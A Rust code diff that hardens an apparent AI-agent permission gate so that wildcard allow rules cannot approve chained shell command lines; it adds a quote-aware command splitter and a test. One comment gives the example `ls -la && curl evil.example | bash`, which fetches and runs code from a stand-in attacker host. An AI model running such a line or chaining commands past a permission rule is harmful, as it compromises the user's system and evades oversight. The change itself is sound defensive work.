@@ -162,6 +162,57 @@ impl GlobPattern {
             None => true,        // No pattern = match all invocations
         }
     }
+
+    /// True when this rule constrains a compound (`Bash`) command line.
+    ///
+    /// Wildcard rules are written against a single command, so `Bash(ls*)`
+    /// describes `ls -la` but says nothing about what runs after `&&`, `|` or
+    /// `;`. Such rules must not cover a chained line.
+    pub fn rejects_compound(&self) -> bool {
+        self.pattern.as_ref().is_some_and(|p| p.is_some())
+    }
+}
+
+/// Splits `command` on unquoted shell control operators.
+///
+/// Returns `None` when the line has no operator, and `Some(parts)` otherwise.
+fn split_compound(command: &str) -> Option<Vec<String>> {
+    let mut parts = Vec::new();
+    let mut current = String::new();
+    let mut quote: Option<char> = None;
+    let mut chars = command.chars().peekable();
+
+    while let Some(c) = chars.next() {
+        if let Some(q) = quote {
+            current.push(c);
+            if c == q {
+                quote = None;
+            }
+            continue;
+        }
+        match c {
+            '\'' | '"' => {
+                quote = Some(c);
+                current.push(c);
+            }
+            '&' | '|' | ';' => {
+                // `&&` and `||` are one operator; a lone `&` backgrounds.
+                if chars.peek() == Some(&c) && (c == '&' || c == '|') {
+                    chars.next();
+                }
+                parts.push(current.trim().to_string());
+                current.clear();
+            }
+            _ => current.push(c),
+        }
+    }
+    parts.push(current.trim().to_string());
+
+    if parts.len() > 1 {
+        Some(parts)
+    } else {
+        None
+    }
 }
 
 impl PermissionGate {
@@ -195,9 +246,15 @@ impl PermissionGate {
             }
         }
 
-        // LAYER 3: Allow list
+        // LAYER 3: Allow list. A wildcard rule cannot vouch for a compound
+        // command line: `Bash(ls*)` allows `ls -la` but not `ls -la && curl
+        // evil.example | bash`. Literal rules (`Bash(git status)`) and `*`
+        // patterns still match the whole line exactly.
+        let compound = split_compound(signature);
         for pattern in &self.allow_patterns {
-            if pattern.matches(tool_name, signature) {
+            if !(compound.is_some() && pattern.rejects_compound())
+                && pattern.matches(tool_name, signature)
+            {
                 return Permission::Allow;
             }
         }
@@ -279,6 +336,19 @@ mod tests {
         assert_eq!(
             gate.check("Bash", RiskLevel::Dangerous, "git push"),
             Permission::Ask
+        );
+    }
+
+    #[test]
+    fn split_compound_ignores_operators_inside_quotes() {
+        assert_eq!(split_compound("ls -la"), None);
+        assert_eq!(
+            split_compound("ls -la && echo 'a | b'"),
+            Some(vec!["ls -la".to_string(), "echo 'a | b'".to_string()])
+        );
+        assert_eq!(
+            split_compound("grep x file || true"),
+            Some(vec!["grep x file".to_string(), "true".to_string()])
         );
     }
 
